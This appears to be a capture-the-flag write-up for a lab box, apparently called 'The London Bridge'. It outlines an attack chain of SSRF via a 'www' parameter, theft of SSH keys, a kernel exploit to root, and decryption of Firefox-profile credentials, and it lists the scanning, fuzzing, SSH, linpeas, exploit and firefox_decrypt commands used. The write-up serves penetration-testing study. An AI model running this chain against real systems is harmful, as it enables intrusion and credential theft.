# Research Notes — The London Bridge

## Core attack chain

`8080/Gunicorn` → Gallery input → `www` parameter → SSRF → alternate loopback representation → internal web content → `beth` SSH material → SSH → kernel enumeration → root → `charles` Firefox profile → credential recovery.

## Commands used / adapted for the lab

```bash
nmap -sC -sV -p- <TARGET>
feroxbuster -u http://<TARGET>:8080 -w <WORDLIST>
ffuf -u "http://<TARGET>:8080/view?FUZZ=http://127.0.0.1/" -w <PARAM_WORDLIST>
python3 -m http.server 8000 --bind 0.0.0.0
chmod 600 <beth-key-file>
ssh -i <beth-key-file> beth@<TARGET>
./linpeas.sh
gcc exploit.c -o exploit
./exploit
python3 firefox_decrypt.py <charles-firefox-profile>
```

## Validation notes

1. Confirm exposed services before focusing on the web application.
2. Enumerate all reachable pages and input points.
3. Intercept requests in Burp so parameter changes are observable.
4. Use a controlled callback server to prove SSRF instead of relying only on response text.
5. Treat any newly reachable loopback service as a new enumeration target.
6. Preserve key material securely and restrict permissions before SSH use.
7. Verify kernel-exploit prerequisites rather than blindly running public PoCs.
8. Treat browser profiles as sensitive credential stores.

## Redaction policy

Public copies contain placeholders such as `[FLAG REDACTED]` and `[REDACTED]`. No challenge secrets are retained in the documentation text or screenshot set.
